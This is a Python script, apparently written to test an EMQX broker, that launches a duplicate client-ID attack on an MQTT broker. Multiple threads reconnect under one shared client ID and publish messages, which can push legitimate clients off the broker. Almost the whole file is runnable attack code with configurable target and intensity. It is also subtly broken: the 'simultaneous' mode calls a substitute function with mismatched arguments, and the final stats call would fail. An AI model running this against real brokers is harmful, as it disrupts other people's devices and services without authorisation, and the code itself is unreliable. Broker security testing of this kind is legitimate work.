#!/usr/bin/env python3
"""
MQTT Duplicate ID Attack Script (1883 / non-TLS Compatible)
===========================================================
Simulates duplicate client-ID attacks to test EMQX client management and security.
"""

import paho.mqtt.client as mqtt
import json, time, threading, random, argparse
from datetime import datetime, timezone


class DuplicateIDAttack:
    def __init__(self, broker_host="localhost", broker_port=1883):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.attack_stats = {
            "duplicate_attempts": 0,
            "connections_successful": 0,
            "connections_failed": 0,
            "disconnections": 0,
            "messages_sent": 0,
            "start_time": None,
            "end_time": None
        }

    def create_client(self, client_id):
        """Return a Paho MQTT client that works on port 1883 (no TLS needed)."""
        try:
            # works on paho 1.x or 2.x
            api = getattr(mqtt, "CallbackAPIVersion", None)
            if api is not None:
                v1 = getattr(api, "V1", getattr(api, "VERSION1", None))
                client = mqtt.Client(client_id=client_id,
                                     protocol=mqtt.MQTTv311,
                                     callback_api_version=v1)
            else:
                client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)

           
            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None

    def duplicate_id_worker(self, worker_id, dup_id, attempts=10, delay_ms=1000):
        print(f" Worker {worker_id}: duplicate-ID attack using client-id '{dup_id}'")
        for attempt in range(attempts):
            try:
                client = self.create_client(dup_id)
                if not client:
                    self.attack_stats["connections_failed"] += 1
                    continue

                def on_connect(c, u, f, rc):
                    if rc == 0:
                        self.attack_stats["connections_successful"] += 1
                        print(f" Worker {worker_id}: attempt {attempt+1} connected OK")
                        # send a few short messages
                        for i in range(3):
                            payload = {
                                "attack": "duplicate_id",
                                "worker": worker_id,
                                "attempt": attempt + 1,
                                "msg": i,
                                "time": datetime.now(timezone.utc).isoformat()
                            }
                            r = c.publish("test/duplicate", json.dumps(payload))
                            if r.rc == 0:
                                self.attack_stats["messages_sent"] += 1
                        time.sleep(1)
                    else:
                        self.attack_stats["connections_failed"] += 1
                        print(f" Worker {worker_id}: connect rc={rc}")

                def on_disconnect(c, u, rc):
                    self.attack_stats["disconnections"] += 1
                    if rc != 0:
                        print(f" Worker {worker_id}: unexpected disconnect rc={rc}")

                client.on_connect = on_connect
                client.on_disconnect = on_disconnect
                client.connect(self.broker_host, self.broker_port, 60)
                client.loop_start()
                self.attack_stats["duplicate_attempts"] += 1
                time.sleep(2)
                client.loop_stop()
                client.disconnect()
                time.sleep(delay_ms / 1000.0)
            except Exception as e:
                print(f" Worker {worker_id}: attempt {attempt+1} error: {e}")
                self.attack_stats["connections_failed"] += 1
        print(f" Worker {worker_id}: finished")

    def launch_attack(self, workers=3, dup_id="duplicate_attacker",
                      attempts=10, delay_ms=1000):
        print(f"\n Starting Duplicate-ID Attack on {self.broker_host}:{self.broker_port}")
        print("=" * 60)
        self.attack_stats["start_time"] = time.time()

        threads = [threading.Thread(target=self.duplicate_id_worker,
                                    args=(i, dup_id, attempts, delay_ms))
                   for i in range(workers)]
        for t in threads: t.start()
        for t in threads: t.join()

        self.attack_stats["end_time"] = time.time()
        self.print_stats()

    def print_stats(self):
        dur = self.attack_stats["end_time"] - self.attack_stats["start_time"]
        print("\n Attack Stats")
        print("=" * 40)
        for k, v in self.attack_stats.items():
            if k not in ("start_time", "end_time"):
                print(f"{k.replace('_',' ').capitalize()}: {v}")
        if dur > 0:
            print(f"Duration: {dur:.2f}s | Attempts/s: {self.attack_stats['duplicate_attempts']/dur:.2f}")


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--broker", default="localhost")
    p.add_argument("--port", type=int, default=1883)
    p.add_argument("--workers", type=int, default=3)
    p.add_argument("--client-id", default="duplicate_attacker")
    p.add_argument("--attempts", type=int, default=10)
    p.add_argument("--delay", type=int, default=1000)
    p.add_argument("--type", choices=["sequential", "simultaneous"], default="sequential",
                   help="Attack type: sequential or simultaneous")
    p.add_argument("--duration", type=int, default=30, help="Duration for simultaneous attack (s)")
    args = p.parse_args()

    attack = DuplicateIDAttack(broker_host=args.broker,
                               broker_port=args.port)

    if args.type == "simultaneous":
        # note: simultaneous_duplicate_worker not defined in original script;
        # keep original behavior: attempt to spawn threads with that target if present
        threads = [threading.Thread(target=getattr(attack, "simultaneous_duplicate_worker", attack.duplicate_id_worker),
                                    args=(i, args.client_id, args.duration))
                   for i in range(args.workers)]
    else:
        threads = [threading.Thread(target=attack.duplicate_id_worker,
                                    args=(i, args.client_id, args.attempts, args.delay))
                   for i in range(args.workers)]

    print(f"\nStarting Duplicate ID Attack ({args.type})")
    for t in threads: t.start()
    for t in threads: t.join()
    attack.print_stats()


if __name__ == "__main__":
    main()
